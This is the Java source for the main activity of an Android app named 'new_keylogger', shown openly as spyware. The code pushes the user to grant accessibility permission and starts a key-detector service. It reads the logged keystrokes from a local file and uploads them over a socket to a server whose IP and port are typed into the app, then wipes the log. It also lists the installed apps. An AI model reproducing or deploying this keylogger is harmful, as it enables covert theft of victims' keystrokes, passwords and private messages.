package com.example.new_keylogger;

import com.example.new_keylogger.R;

import static android.app.Service.START_NOT_STICKY;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.text.Editable;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    TextView text_view;
    RelativeLayout layout;
    Button updateBtn;
    Button getAppsBtn;
    Button deleteFileBtn;
    Button actionBtn;
    int times_pressed_delete = 0;
    ClientThread clientThread;
    String SERVER_IP;
    int SERVER_PORT;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.accessibility_layout);

        text_view = findViewById(R.id.text_view);
        layout = findViewById(R.id.layout1);

        updateBtn = findViewById(R.id.updateBtn);

        updateBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String text = get_text(v);
                text_view.setText(text);
                upload_keys(text);
                for (int i=1; i<=5; i++) {
                    delete_file(v);
                }
            }
        });

        getAppsBtn = findViewById(R.id.getAppsBtn);
        getAppsBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String text = stop_service(v);
                text_view.setText(text);
            }
        });

        deleteFileBtn = findViewById(R.id.deleteFileBtn);
        deleteFileBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                delete_file(v);
            }
        });

        actionBtn = findViewById(R.id.actionBtn);
        actionBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                connect();
            }
        });
        checkAccessibilityPermission();
        Intent intent1 = null;
        intent1 = new Intent(this, AccessibilityKeyDetector.class);
        startService(intent1);
        getAppsBtn.setText("Set iP/get apps");
    }


    public boolean checkAccessibilityPermission() {
        int accessEnabled=0;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.CUPCAKE) {
                accessEnabled = Settings.Secure.getInt(this.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
            }
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        if (accessEnabled==0) {
            // if not construct intent to request permission
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // request permission via start activity for result
            startActivity(intent);
            return false;
        } else {
            return true;
        }
    }
    public void upload_keys(String text) {
        if (!clientThread.Connected) {
            this.connect();
        }
        clientThread.sendMessage(text);
    }

    public void connect() {
        EditText ip = findViewById(R.id.ip);
        Editable editableText = ip.getText();
        SERVER_IP = editableText.toString();

        EditText port = findViewById(R.id.port);
        editableText = port.getText();
        SERVER_PORT = Integer.parseInt(editableText.toString());

        clientThread = new ClientThread(SERVER_IP, SERVER_PORT);
        Thread thread = new Thread(clientThread);
        thread.start();
    }

    public String get_text(View view) {
        try {
            String text = "";
            String line;
            FileInputStream file = openFileInput("example.txt");
            InputStreamReader isr = new InputStreamReader(file);
            BufferedReader inBuff = new BufferedReader(isr);
            while ((line = inBuff.readLine()) != null) {
                text = text + line + "/n";
            }
            inBuff.close();
            isr.close();
            file.close();
            return text;
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
    boolean flag0 = false;
    public String stop_service(View view) {
        if (flag0) {
            flag0 = !flag0;
            try {
                String text = "";
                String line;
                FileInputStream file = openFileInput("example.txt");
                InputStreamReader isr = new InputStreamReader(file);
                BufferedReader inBuff = new BufferedReader(isr);
                while ((line = inBuff.readLine()) != null) {
                    text = text + line + "/n";
                }
                inBuff.close();
                isr.close();
                file.close();
                return text;
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }else {
            flag0 = !flag0;
            PackageManager pm = getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(0);
            String s = "";
            for (PackageInfo info : packages) {
                String packageName = info.packageName;
                String versionName = info.versionName;
                s = s + packageName + " " + versionName + " ";
            }
            return s;
        }
    }
    public void delete_file(View view) {
        times_pressed_delete += 1;
        if (times_pressed_delete == 5) {
            times_pressed_delete = 0;
            try {
                FileOutputStream file = openFileOutput("example.txt", MODE_PRIVATE);
                file.write("[new_file]".getBytes());
                file.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }}
